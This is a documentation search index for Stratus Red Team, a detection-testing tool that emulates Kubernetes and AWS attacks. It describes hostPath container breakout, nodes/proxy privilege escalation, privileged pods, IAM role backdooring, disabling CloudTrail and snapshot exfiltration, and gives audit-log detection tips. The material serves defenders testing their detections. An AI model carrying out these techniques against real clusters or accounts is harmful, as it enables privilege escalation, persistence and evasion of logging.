</ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/","title":"Container breakout via hostPath volume mount","text":"<p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Privilege Escalation</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/#description","title":"Description","text":"<p>Creates a Pod with the entire node root filesystem as a hostPath volume mount</p> <p>References:</p> <ul> <li>https://attack.mitre.org/techniques/T1611/</li> <li>https://www.youtube.com/watch?v=gtaaONq-XGY</li> </ul> <p>Warm-up: </p> <ul> <li>Creates the Stratus Red Team namespace</li> </ul> <p>Detonation: </p> <ul> <li>Create a privileged busybox pod with the node root filesystem mounted at \"/host\"      that reads \"/etc/passwd\" from the host filesystem</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.hostpath-volume/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.privilege-escalation.hostpath-volume\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/","title":"Privilege escalation through node/proxy permissions","text":"<p>idempotent </p> <p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Privilege Escalation</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#description","title":"Description","text":"<p>Uses the node proxy API to proxy a Kubelet request through a worker node. This is a vector of privilege escalation, allowing any principal with the <code>nodes/proxy</code> permission to escalate their privilege to cluster administrator,  bypassing at the same time admission control checks and logging of the API server.</p> <p>Warm-up:</p> <ul> <li>Create a namespace</li> <li>Create a service account in this namespace</li> <li>Create a cluster role with <code>nodes/proxy</code> permissions </li> <li>Bind the cluster role to the service account</li> </ul> <p>Detonation:</p> <ul> <li>Retrieve a token for the service account with <code>nodes/proxy</code> permissions creating during warm-up</li> <li>Use the node proxy API to proxy a benign request to the Kubelet through the worker node</li> </ul> <p>References:</p> <ul> <li>https://blog.aquasec.com/privilege-escalation-kubernetes-rbac</li> <li>https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.22/#-strong-proxy-operations-node-v1-core-strong-</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.privilege-escalation.nodes-proxy\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.nodes-proxy/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs, you can identify when the nodes proxy API is used.</p> <p>Sample event (shortened):</p> <pre><code>{\n  \"objectRef\": {\n    \"resource\": \"nodes\",\n    \"subresource\": \"proxy\",\n    \"name\": \"ip-192-168-34-255.eu-west-1.compute.internal\",\n    \"apiVersion\": \"v1\"\n  },\n  \"http\": {\n    \"url_details\": {\n      \"path\": \"/api/v1/nodes/ip-192-168-34-255.eu-west-1.compute.internal/proxy/runningpods/\"\n    },\n    \"method\": \"get\",\n    \"status_code\": 200,\n    \"status_category\": \"OK\"\n  },\n  \"kind\": \"Event\",\n  \"level\": \"Request\",\n  \"requestURI\": \"/api/v1/nodes/ip-192-168-34-255.eu-west-1.compute.internal/proxy/runningpods/\",\n}\n</code></pre> <p>Under normal operating conditions, it's not expected that this API is used frequently.  Consequently, alerting on <code>objectRef.resource == \"nodes\" &amp;&amp; objectRef.subresource == \"proxy\"</code> should yield minimal false positives.</p> <p>Additionally, looking at the Kubelet API path that was proxied can help identify malicious activity (/runningpods in this example). See kubeletctl for an unofficial list of Kubelet API endpoints.</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/","title":"Run a Privileged Pod","text":"<p>Platform: Kubernetes</p>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#mappings","title":"Mappings","text":"<ul> <li>MITRE ATT&amp;CK<ul> <li>Privilege Escalation</li> </ul> </li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#description","title":"Description","text":"<p>Runs a privileged pod. Privileged pods are equivalent to running as root on the worker node, and can be used for privilege escalation.</p> <p>Resources:</p> <ul> <li>https://www.cncf.io/blog/2020/10/16/hack-my-mis-configured-kubernetes-privileged-pods/</li> <li>https://kubernetes.io/docs/tasks/configure-pod-container/security-context/</li> </ul> <p>Warm-up: </p> <ul> <li>Creates the Stratus Red Team namespace</li> </ul> <p>Detonation: </p> <ul> <li>Create a privileged busybox pod</li> </ul>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#instructions","title":"Instructions","text":"Detonate with Stratus Red Team<pre><code>stratus detonate k8s.privilege-escalation.privileged-pod\n</code></pre>"},{"location":"attack-techniques/kubernetes/k8s.privilege-escalation.privileged-pod/#detection","title":"Detection","text":"<p>Using Kubernetes API server audit logs, looking for pod creation events with <code>requestObject.spec.containers[*].securityContext.privileged</code> set to <code>true</code>.</p> <p>Sample event (shortened):</p> <pre><code>{\n    \"objectRef\": {\n        \"resource\": \"pods\",\n        \"name\": \"k8s.privilege-escalation.privileged-pod\",\n        \"apiVersion\": \"v1\"\n    },\n    \"http\": {\n        \"url_details\": {\n            \"path\": \"/api/v1/namespaces/stratus-red-team-umusjhhg/pods\"\n        },\n        \"method\": \"create\",\n        \"status_code\": 201\n    },\n    \"stage\": \"ResponseComplete\",\n    \"kind\": \"Event\",\n    \"level\": \"RequestResponse\",\n    \"requestURI\": \"/api/v1/namespaces/stratus-red-team-umusjhhg/pods\",\n    \"requestObject\": {\n        \"kind\": \"Pod\",\n        \"spec\": {\n            \"containers\": [{\n                \"image\": \"busybox:stable\",\n                \"args\": [\"while true; do sleep 3600; done\"],\n                \"command\": [\"sh\", \"-c\"],\n                \"securityContext\": {\n                    \"privileged\": true\n                }\n            }]\n        }\n    }\n}\n</code></pre>"},{"location":"user-guide/examples/","title":"Examples","text":"<p>This page contains a full example of using Stratus Red Team.</p>"},{"location":"user-guide/examples/#example-1-basic-usage","title":"Example 1: Basic usage","text":""},{"location":"user-guide/examples/#authenticating-to-aws","title":"Authenticating to AWS","text":"<p>First, we'll authenticate to AWS using aws-vault:</p> <pre><code>$ aws-vault exec sandbox-account\n# If using an IAM user, use instead: aws-vault exec sandbox-account --no-session\n\n$ aws sts get-caller-identity\n{\n    \"UserId\": \"AIDA254BBSGPGUZJKQWRD\",\n    \"Account\": \"012345678912\",\n    \"Arn\": \"arn:aws:iam::012345678912:user/christophe\"\n}\n</code></pre> <p>Stratus Red Team should support any authentication option supported by the AWS Go SDK v2. The general rule of thumb is: if you can run <code>aws sts get-caller-identity</code>, you can run Stratus Red Team.</p>"},{"location":"user-guide/examples/#listing-available-attack-techniques","title":"Listing available Attack Techniques","text":"<p>Let's say we want to confirm our security products identify common persistence mechanisms in our AWS account. Let's ask Stratus Red Team for the relevant available attack techniques:</p> <pre><code>$ stratus list --platform aws --mitre-attack-tactic persistence\n\n+-----------------------------------------------+-----------------------------------------+----------+----------------------+\n| TECHNIQUE ID                                  | TECHNIQUE NAME                          | PLATFORM | MITRE ATT&amp;CK TACTIC  |\n+-----------------------------------------------+-----------------------------------------+----------+----------------------+\n| aws.persistence.iam-backdoor-role             | Backdoor an existing IAM Role           | AWS      | Persistence          |\n| aws.persistence.iam-backdoor-user             | Create an IAM Access Key on an IAM User | AWS      | Persistence          |\n|                                               |                                         |          | Privilege Escalation |\n| aws.persistence.iam-create-user-login-profile | Create a Login Profile on an IAM user   | AWS      | Persistence          |\n|                                               |                                         |          | Privilege Escalation |\n| aws.persistence.iam-create-admin-user            | Create an administrative IAM User       | AWS      | Persistence          |\n|                                               |                                         |          | Privilege Escalation |\n+-----------------------------------------------+-----------------------------------------+----------+----------------------+\n</code></pre>"},{"location":"user-guide/examples/#detonating-an-attack-technique","title":"Detonating an attack technique","text":"<p>We're interested in <code>aws.persistence.iam-backdoor-role</code>, an attack technique that backdoors an existing IAM role to add a trust relationship with a malicious AWS account.</p> <p>Let's retrieve more information about the technique, either through its automatically-generated documentation, or by running:</p> <pre><code>$ stratus show aws.persistence.iam-backdoor-role\nEstablishes persistence by backdooring an existing IAM role, allowing it to be assumed from an external AWS account.\n\nWarm-up: Creates the prerequisite IAM role.\n\nDetonation: Updates the assume role policy of the IAM role to backdoor it.\n</code></pre> <p>We now know that Stratus Red Team will first create an IAM role in the warm-up phase. In the detonation phase, it will backdoor the role.</p> <p>We could choose to perform the warm-up and detonation phase separately - but for simplicity, let's do it all together:</p> <pre><code>$ stratus detonate aws.persistence.iam-backdoor-role\n2022/01/19 10:28:08 Checking your authentication against the AWS API\n2022/01/19 10:28:09 Warming up aws.persistence.iam-backdoor-role\n2022/01/19 10:28:09 Initializing Terraform\n2022/01/19 10:28:18 Applying Terraform\n2022/01/19 10:28:32 Backdooring IAM role by allowing sts:AssumeRole from an external AWS account\n</code></pre> <p>Great! The attack technique has been executed against our AWS account.</p> <p>We can verify this using:</p> <pre><code>$ stratus status\n+------------------------------------+-------------------------------+-----------+\n| ID                                 | NAME                          | STATUS    |\n+------------------------------------+-------------------------------------------+\n| aws.persistence.iam-backdoor-role  | Backdoor an existing IAM Role | DETONATED |\n...\n</code></pre>"},{"location":"user-guide/examples/#viewing-the-resulting-resource","title":"Viewing the resulting resource","text":"<p>If we open the AWS console and go to the role that Stratus Red Team backdoored, we can see the malicious role trust policy:</p> <pre><code>{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"Service\": \"ec2.amazonaws.com\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    },\n    {\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"arn:aws:iam::193672423079:root\"\n      },\n      \"Action\": \"sts:AssumeRole\"\n    }\n  ]\n}\n</code></pre>"},{"location":"user-guide/examples/#cleaning-up","title":"Cleaning up","text":"<p>When using <code>stratus detonate</code>, the resources spun up are not cleaned up by default - you'd have to pass the <code>--cleanup</code> flag for that.</p> <p>We can clean up any resources creates by Stratus Red Team using:</p> <pre><code>stratus cleanup aws.persistence.iam-backdoor-role\n</code></pre>"},{"location":"user-guide/examples/#example-2-advanced-usage","title":"Example 2: Advanced usage","text":"<p>In this example, we want to prepare our live environment with the prerequisites ahead of time - say, a few hours before detonating our attack techniques.</p> <p>We start by warming up the techniques we're interested in:</p> <pre><code>stratus warmup aws.defense-evasion.cloudtrail-stop aws.defense-evasion.vpc-remove-flow-logs aws.persistence.iam-backdoor-user\n</code></pre> <p>We now have the prerequisites ready:</p> <pre><code>CloudTrail trail arn:aws:cloudtrail:us-east-1:0123456789012:trail/my-cloudtrail-trail ready\nVPC Flow Logs fl-0ef2f69f9799cf52e in VPC vpc-072ec3075f9b5046a ready\nIAM user sample-legit-user ready\n</code></pre> <p>At this point, we can choose to detonate these attack techniques at any point we want. We can do it right away, or in a few hours / days:</p> <pre><code>stratus detonate aws.defense-evasion.cloudtrail-stop aws.defense-evasion.vpc-remove-flow-logs aws.persistence.iam-backdoor-user\n</code></pre> <pre><code>Stopping CloudTrail trail my-cloudtrail-trail\nRemoving VPC Flow Logs fl-0ef2f69f9799cf52e in VPC vpc-072ec3075f9b5046a\nCreating access key on legit IAM user to simulate backdoor\n</code></pre> <p>Now, say we want to replay (i.e., detonate again) an attack technique a few times, for testing and to iterate building our threat detection rules on the side:</p> <pre><code>stratus detonate aws.persistence.iam-backdoor-user\n</code></pre> <p>You will notice that the second call raises an error:</p> <pre><code>aws.persistence.iam-backdoor-user has already been detonated and is not idempotent. \nRevert it with 'stratus revert' before detonating it again, or use --force\n</code></pre> <p>That's because the detonation of this attack technique is not idempotent, meaning it cannot be detonated multiple times without being reverted. </p> <p>Before re-detonating this technique, we need to revert it:</p> <pre><code>stratus revert aws.persistence.iam-backdoor-user\n</code></pre> <pre><code>2022/01/19 15:43:35 Reverting detonation of technique aws.persistence.iam-backdoor-user\n2022/01/19 15:43:35 Removing access key from IAM user sample-legit-user\n2022/01/19 15:43:36 Removing access key AKIA254BBSGPJNHEDHNR\n+-----------------------------------+-----------------------------------------+--------+\n| ID                                | NAME                                    | STATUS |\n+-----------------------------------+-----------------------------------------+--------+\n| aws.persistence.iam-backdoor-user | Create an IAM Access Key on an IAM User | WARM   |\n+-----------------------------------+-----------------------------------------+--------+\n</code></pre> <p>Our attack technique is now <code>WARM</code>, we can detonate it again:</p> <pre><code>stratus detonate aws.persistence.iam-backdoor-user\n</code></pre> <p>Generally, we can detonate then revert an attack technique indefinitely:</p> <pre><code>while true; do\n  stratus detonate aws.persistence.iam-backdoor-user\n  stratus revert aws.persistence.iam-backdoor-user\n  sleep 1\ndone\n</code></pre> <p>Once we are done with our testing, we can clean up our techniques. Cleaning up a technique will revert its detonation logic (if applicable), then nuke all its prerequisite resources and infrastructure:</p> <pre><code>stratus cleanup aws.defense-evasion.cloudtrail-stop aws.defense-evasion.vpc-remove-flow-logs aws.persistence.iam-backdoor-user\n</code></pre> <p>Or, more succinctly:</p> <pre><code>stratus cleanup --all\n</code></pre>"},{"location":"user-guide/getting-started/","title":"Getting Started","text":""},{"location":"user-guide/getting-started/#installation","title":"Installation","text":"<p>Direct install (requires Go 1.23+):</p> <pre><code>go install -v github.com/datadog/stratus-red-team/v2/cmd/stratus@latest\n</code></pre> <ul> <li>Homebrew:</li> </ul> <pre><code>brew tap \"datadog/stratus-red-team\" \"https://github.com/DataDog/stratus-red-team\"\nbrew install datadog/stratus-red-team/stratus-red-team\n</code></pre> <ul> <li> <p>Linux / Windows / macOS: Download a pre-built binary.</p> </li> <li> <p>Docker:</p> </li> </ul> <pre><code>IMAGE=\"ghcr.io/datadog/stratus-red-team\"\nalias stratus=\"docker run --rm -v $HOME/.stratus-red-team/:/root/.stratus-red-team/ -e AWS_ACCESS_KEY_ID -e AWS_SECRET_ACCESS_KEY -e AWS_SESSION_TOKEN -e AWS_DEFAULT_REGION $IMAGE\"\n</code></pre>"},{"location":"user-guide/getting-started/#concepts","title":"Concepts","text":"<p>An attack technique is a granular TTP that has prerequisites infrastructure or configuration. You can see the list of attack techniques supported by Stratus Red Team here.</p> <p>Warming up an attack technique means making sure its prerequisites are met, without detonating it.  Warm-up is a preparation phase, before executing the actual attack. Behind the scenes, Stratus Red Team transparently uses Terraform<sup>1</sup> to spin up and tear down the prerequisites of each attack technique.</p> <p>Detonating an attack technique means executing it against a live environment, for instance against a test AWS account.</p> <p>Reverting an attack technique means \"cancelling\" its detonation, when it had a side effect.</p> <p>Cleaning up an attack technique means nuking all its prerequisites and making sure no resource is left in your environment.</p> <p>An attack technique is idempotent if it can be detonated multiple times without reverting it.</p>"},{"location":"user-guide/getting-started/#example","title":"Example","text":"<p>Let's take an example with the attack technique Exfiltrate EBS Snapshot through Snapshot Sharing.</p> <ul> <li>Warm-up: Create an EBS volume and a snapshot of it</li> <li>Detonation: Share the EBS snapshot with an external AWS account</li> <li>Revert: Unshare the EBS snapshot with the external AWS account</li> <li>Clean-up: Remove the EBS volume and its snapshot</li> </ul>"},{"location":"user-guide/getting-started/#state-machine","title":"State Machine","text":"<p>The diagram below illustrates the different states in which an attack technique can be.</p> <p></p> State Machine of a Stratus Attack Technique"},{"location":"user-guide/getting-started/#sample-usage","title":"Sample Usage","text":"<p>Stratus Red Team is a self-contained Go binary, embedding all the attack techniques it supports emulating.</p> <p>You can list available attack techniques using:</p> <pre><code>stratus list\n</code></pre> <p>Detonating a specific attack technique is as simple as running:</p> <pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>You will get an output similar to:</p> <pre><code>2022/01/18 22:32:11 Checking your authentication against the AWS API\n2022/01/18 22:32:12 Warming up aws.exfiltration.ec2-share-ebs-snapshot\n2022/01/18 22:32:12 Initializing Terraform\n2022/01/18 22:32:19 Applying Terraform\n2022/01/18 22:32:43 Sharing the volume snapshot with an external AWS account ID...\n</code></pre> <p>You can then clean up any leftovers from the technique, which in this case will remove the EBS volume and EBS snapshot:</p> <pre><code>stratus cleanup aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>For more information, see Usage, Examples and the Command Reference.</p>"},{"location":"user-guide/getting-started/#connecting-to-your-cloud-account","title":"Connecting to your cloud account","text":"<p>Stratus Red Team currently supports AWS, Azure, Kubernetes, and Amazon EKS.</p> <p>Warning</p> <p>Stratus Red Team is supposed to be used against a sandbox cloud account that does not handle production workloads or infrastructure.</p>"},{"location":"user-guide/getting-started/#aws","title":"AWS","text":"<p>In order to use Stratus attack techniques against AWS, you need to be authenticated prior to running it, for instance:</p> <ul> <li> <p>Using <code>aws-vault</code></p> </li> <li> <p>Using static credentials in <code>~/.aws/config</code>, and setting your desired AWS profile using <code>export AWS_PROFILE=my-profile</code></p> </li> </ul>"},{"location":"user-guide/getting-started/#eks","title":"EKS","text":"<p>Stratus Red Team does not create an EKS cluster for you. It assumes you're already authenticated to an EKS cluster.</p> <p>To use Stratus attack techniques against Amazon EKS, you need to be authenticated against AWS, as described above. Stratus Red Team will use the current AWS credentials and Kubernetes context to interact with the EKS cluster. It will check that the Kubernetes cluster you're connected to is an EKS cluster, and refuse to run otherwise.</p> <ul> <li>Authenticate to AWS (for instance, using <code>aws-vault</code>)</li> <li>Run <code>aws eks update-kubeconfig --name your-cluster-name --region your-region</code> to update your <code>~/.kube/config</code> file with the EKS cluster configuration</li> </ul>"},{"location":"user-guide/getting-started/#azure","title":"Azure","text":"<ul> <li>Use the Azure CLI to authenticate against your Azure tenant:</li> </ul> <pre><code>az login\n</code></pre> <ul> <li>Confirm you have access to at least one Azure subscription:</li> </ul> <pre><code>$ az account list\n[\n  {\n    \"cloudName\": \"AzureCloud\",\n    \"homeTenantId\": \"9bd23af5-8f8b-4410-8418-2bc670d4829a\",\n    \"id\": \"45e0ad3f-ff94-499a-a2f0-bbb884e9c4a3\",\n    \"isDefault\": true,\n    \"managedByTenants\": [],\n    \"name\": \"Azure subscription 1\",\n    \"state\": \"Enabled\",\n    \"tenantId\": \"9bd23af5-8f8b-4410-8418-2bc670d4829a\",\n    \"user\": {\n      \"name\": \"you@domain.tld\",\n      \"type\": \"user\"\n    }\n  }\n]\n</code></pre> <ul> <li>Set the environment variable <code>AZURE_SUBSCRIPTION_ID</code>:</li> </ul> <pre><code>export AZURE_SUBSCRIPTION_ID=45e0ad3f-ff94-499a-a2f0-bbb884e9c4a3\n</code></pre> <p>Note</p> <p>When using Stratus Red Team with Azure, the location in which resources are created cannot be configured and is fixed to <code>West US</code> (California). See why here.</p>"},{"location":"user-guide/getting-started/#microsoft-entra-id","title":"Microsoft Entra ID","text":"<ul> <li>Use the Azure CLI to authenticate against your Azure tenant:</li> </ul> <pre><code>az login\n</code></pre>"},{"location":"user-guide/getting-started/#gcp","title":"GCP","text":"<ul> <li>Use the gcloud CLI to authenticate against GCP:</li> </ul> <pre><code>gcloud auth application-default login\n</code></pre> <ul> <li>Then, set your project ID:</li> </ul> <pre><code>export GOOGLE_PROJECT=your-project-id\n</code></pre>"},{"location":"user-guide/getting-started/#kubernetes","title":"Kubernetes","text":"<p>Stratus Red Team does not create a Kubernetes cluster for you.  Instead, it assumes you're already authenticated against a test Kubernetes cluster with kubectl and uses your default context.</p> <p>As a rule of thumb, Stratus Red Team detonates attack techniques against the cluster you see when running <code>kubectl cluster-info</code>.</p> <p>Tested with Minikube and AWS EKS.</p> <p>Encountering issues? See our troubleshooting page, or open an issue.</p> <ol> <li> <p>While Stratus Red Team uses Terraform under the hood, it doesn't mess with your current Terraform install nor does it require you to install Terraform as a prerequisite. Stratus Red Team will download its own Terraform binary in <code>$HOME/.stratus-red-team</code>.\u00a0\u21a9</p> </li> </ol>"},{"location":"user-guide/programmatic-usage/","title":"Programmatic Usage","text":"<p>Stratus Red Team is mainly used from the CLI, but you can use it programmatically as well! Use-cases include automation, and creating your own attack techniques.</p> <p>Info</p> <p>When using Stratus Red Team programmatically, it will persist its state just like when using the CLI. </p> <p>So for instance, if you warm up a specific attack technique programmatically, running <code>stratus status</code> will show the technique is in <code>WARM</code> state.</p>"},{"location":"user-guide/programmatic-usage/#installing-stratus-red-team-as-a-dependency","title":"Installing Stratus Red Team as a dependency","text":"<p>Run:</p> <pre><code>go get github.com/datadog/stratus-red-team/v2\ngo get -d\n</code></pre>"},{"location":"user-guide/programmatic-usage/#example-usage","title":"Example usage","text":"<p>See https://github.com/DataDog/stratus-red-team/tree/main/examples</p>"},{"location":"user-guide/programmatic-usage/#reference","title":"Reference","text":"<p>https://pkg.go.dev/github.com/datadog/stratus-red-team/v2/pkg/stratus</p>"},{"location":"user-guide/troubleshooting/","title":"Troubleshooting","text":""},{"location":"user-guide/troubleshooting/#you-are-not-authenticated-against-aws-or-you-have-not-set-your-region","title":"\"You are not authenticated against AWS, or you have not set your region.\"","text":"<p>You must be authenticated to AWS before running Stratus Red Team. Typically, you must be able to run <code>aws sts get-caller-identity</code> in your shell before running Stratus Red Team.</p>"},{"location":"user-guide/troubleshooting/#the-argument-region-is-required-but-no-definition-was-found","title":"\"The argument \"region\" is required, but no definition was found\"","text":"<p>This is a Terraform error indicating you did not set <code>AWS_REGION</code>. Set it using:</p> <pre><code>export AWS_REGION=us-east-1\n</code></pre>"},{"location":"user-guide/usage/","title":"Usage","text":"<p>List available TTPs using:</p> <pre><code># List all techniques\nstratus list\n\n# List all persistence techniques\nstratus list --mitre-attack-tactic persistence\n\n# List all AWS tactics\nstratus list --platform aws\n</code></pre> <p>View the detail of a specific technique:</p> <pre><code>$ stratus show aws.exfiltration.ec2-share-ebs-snapshot\nExfiltrates an EBS snapshot by sharing it with an external AWS account.\n\nWarm-up: Creates an EBS volume and a snapshot.\nDetonation: Calls ModifySnapshotAttribute to share the snapshot.\n</code></pre> <p>Detonate an attack technique using:</p> <pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>This will handle warm-up and detonation (but not cleanup - explicitly use <code>--cleanup</code> for this).</p> <pre><code>stratus detonate aws.exfiltration.ec2-share-ebs-snapshot --cleanup\n</code></pre> <p>Alternatively, you can handle warm-up and detonation independently:</p> <pre><code>stratus warmup aws.exfiltration.ec2-share-ebs-snapshot\nstratus detonate aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>Cleanup can also be done through:</p> <pre><code>stratus cleanup aws.exfiltration.ec2-share-ebs-snapshot\n</code></pre> <p>At any time, you can view the state of the TTPs:</p> <pre><code>stratus status\n\n+------------------------------------------------------------+-----------+\n| TECHNIQUE                                                  | STATUS    |\n+------------------------------------------------------------+-----------+\n| aws.exfiltration.ec2-share-ebs-snapshot | WARM      |\n| aws.persistence.iam-backdoor-user                          | DETONATED |\n| aws.persistence.iam-backdoor-role                          | WARM      |\n| aws.persistence.iam-create-admin-user                         | COLD      |\n+------------------------------------------------------------+-----------+\n</code></pre>"},{"location":"user-guide/commands/","title":"Commands reference","text":"<ul> <li>Autocompletion</li> <li>list</li> <li>status</li> <li>show</li> <li>warmup</li> <li>detonate</li> <li>revert</li> <li>cleanup</li> </ul>"},{"location":"user-guide/commands/autocompletion/","title":"Autocompletion","text":"<p>Stratus Red Team uses cobra's built-in support to add autocompletions when working with the CLI.</p>"},{"location":"user-guide/commands/autocompletion/#sample-usage","title":"Sample usage","text":"<pre><code>stratus deton[tab]\nstratus detonate aws[tab][tab]\n</code></pre>"},{"location":"user-guide/commands/autocompletion/#setup","title":"Setup","text":""},{"location":"user-guide/commands/autocompletion/#through-homebrew","title":"Through Homebrew","text":"<p>When installing Stratus Red Team through Homebrew, shell completions are automatically installed for bash, zsh and fish shells.</p>"},{"location":"user-guide/commands/autocompletion/#manually","title":"Manually","text":"bashzshfish <p>Ensure you have bash-completion installed (<code>brew install bash-completion</code>  / <code>apt install bash-completion</code>), then run:</p> Mac OSLinux <pre><code># Install bash-completion if necessary\nbrew install bash-completion\n\nstratus completion bash &gt; /usr/local/etc/bash_completion.d/stratus\necho \"source /usr/local/etc/bash_completion\" &gt;&gt; ~/.bashrc\n</code></pre> <pre><code># Install bash-completion if necessary\nsudo apt install bash-completion\n\nsudo mkdir -p /etc/bash_completion.d\nstratus completion bash | sudo tee /etc/bash_completion.d/stratus &gt; /dev/null\necho \"source /etc/bash_completion\" &gt;&gt; ~/.bashrc\n</code></pre> <pre><code>echo \"autoload -U compinit; compinit\" &gt;&gt; ~/.zshrc\nsource ~/.zshrc\nstratus completion zsh &gt; \"${fpath[1]}/_stratus\"\n</code></pre> <pre><code>stratus completion fish &gt; ~/.config/fish/completions/stratus.fish\n</code></pre>"},{"location":"user-guide/commands/cleanup/","title":"<code>stratus cleanup</code>","text":"<p>Cleans up any leftover infrastructure from an attack technique.</p>"},{"location":"user-guide/commands/cleanup/#sample-usage","title":"Sample Usage","text":"Clean up an attack technique<pre><code>stratus cleanup aws.defense-evasion.cloudtrail-stop\n</code></pre> Clean up all attack techniques that can be cleaned up<pre><code>stratus cleanup --all\n</code></pre>"},{"location":"user-guide/commands/cleanup/#difference-with-stratus-revert","title":"Difference with <code>stratus revert</code>","text":"<p><code>stratus revert</code> is about reverting the side effects of a detonation. In addition to reverting an attack technique, <code>stratus cleanup</code> also takes care of removing all prerequisite infrastructure from your live environment.</p>"},{"location":"user-guide/commands/detonate/","title":"<code>stratus detonate</code>","text":"<p>Detonates an attack technique.</p> <ul> <li>If the technique was previously warmed up using <code>stratus warmup</code>, it will not be warmed up again.</li> <li>Otherwise, <code>stratus detonate</code> will automatically warm up the technique before detonating it.</li> </ul>"},{"location":"user-guide/commands/detonate/#sample-usage","title":"Sample Usage","text":"Detonate an attack technique<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy\n</code></pre> Detonate multiple attack techniques<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy aws.defense-evasion.cloudtrail-stop\n</code></pre> Detonate an attack technique, then automatically clean up any resources deployed on AWS<pre><code>stratus detonate aws.exfiltration.s3-backdoor-bucket-policy --cleanup\n</code></pre>"},{"location":"user-guide/commands/list/","title":"<code>stratus list</code>","text":""},{"location":"user-guide/commands/list/#sample-usage","title":"Sample Usage","text":"List all available attack techniques<pre><code>stratus list\n</code></pre> List available attack techniques for AWS<pre><code>stratus list --platform aws\n</code></pre> List available attack techniques for the MITRE ATT&amp;CK 'persistence' tactic<pre><code>stratus list --platform aws --mitre-attack-tactic persistence\n</code></pre>"},{"location":"user-guide/commands/revert/","title":"<code>stratus revert</code>","text":"<p>Reverts the detonation of an attack technique, when applicable.</p> <p>Some attack techniques are not idempotent, meaning that you cannot detonate them multiple times because of their side effect. For instance, Stop a CloudTrail Trail stops a CloudTrail Trail when detonated. Consequently, it cannot be detonated again (as the Trail is already stopped).</p> <p><code>stratus revert</code> ensures that a non-idempotent technique is reverted to a state where it can be detonated again.</p>"},{"location":"user-guide/commands/revert/#sample-usage","title":"Sample Usage","text":"Revert an attack technique<pre><code>stratus revert aws.persistence.lambda-backdoor-function\n</code></pre>"},{"location":"user-guide/commands/revert/#difference-with-stratus-cleanup","title":"Difference with <code>stratus cleanup</code>","text":"<p><code>stratus cleanup</code> both reverts an attack technique, and removes any deployed prerequisite infrastructure from your live environment. </p>"},{"location":"user-guide/commands/show/","title":"<code>stratus show</code>","text":""},{"location":"user-guide/commands/show/#sample-usage","title":"Sample Usage","text":"Display more information about an attack technique<pre><code>stratus show aws.credential-access.ec2-steal-instance-credentials\n</code></pre>"},{"location":"user-guide/commands/status/","title":"<code>stratus status</code>","text":"<p>Displays the current state of the attack techniques.</p> <p>See: Stratus Red Team attack technique states</p>"},{"location":"user-guide/commands/status/#sample-usage","title":"Sample Usage","text":"List the current state of available attack techniques<pre><code>stratus status\n</code></pre>"},{"location":"user-guide/commands/status/#sample-output","title":"Sample output","text":"<pre><code>+------------------------------------------------------------+--------------------------------------------------------+-------------+\n| ID                                                         | NAME                                                   | STATUS      |\n+------------------------------------------------------------+--------------------------------------------------------+-------------+\n| aws.defense-evasion.cloudtrail-stop                        | Stop a CloudTrail Trail                                | WARM        |\n| aws.defense-evasion.organizations-leave                    | Attempt to Leave the AWS Organization                  | COLD        |\n| aws.defense-evasion.vpc-remove-flow-logs                   | Remove VPC Flow Logs                                   | WARM        |\n| aws.persistence.iam-backdoor-user                          | Create an Access Key on an IAM User                    | DETONATED   |\n+------------------------------------------------------------+--------------------------------------------------------+-------------+\n</code></pre>"},{"location":"user-guide/commands/warmup/","title":"<code>stratus warmup</code>","text":"<p>\"Warm up\" an attack technique by spinning up the prerequisite infrastructure or configuration, without detonating it.</p> <p>For example, the attack technique Exfiltrate an AMI by Sharing It needs an AMI before the detonation phase can detonate the attack, and share it with an external AWS account.</p>"},{"location":"user-guide/commands/warmup/#sample-usage","title":"Sample Usage","text":"Warm up an attack technique<pre><code>stratus warmup aws.exfiltration.ec2-share-ami\n</code></pre> Warm up multiple attack techniques<pre><code>stratus warmup aws.exfiltration.ec2-share-ami aws.exfiltration.s3-backdoor-bucket-policy\n</code></pre> (advanced) Warm up again an attack technique that was already WARM, to ensure its prerequisites are met<pre><code>stratus warmup aws.exfiltration.ec2-share-ami --force\n</code></pre>"}]}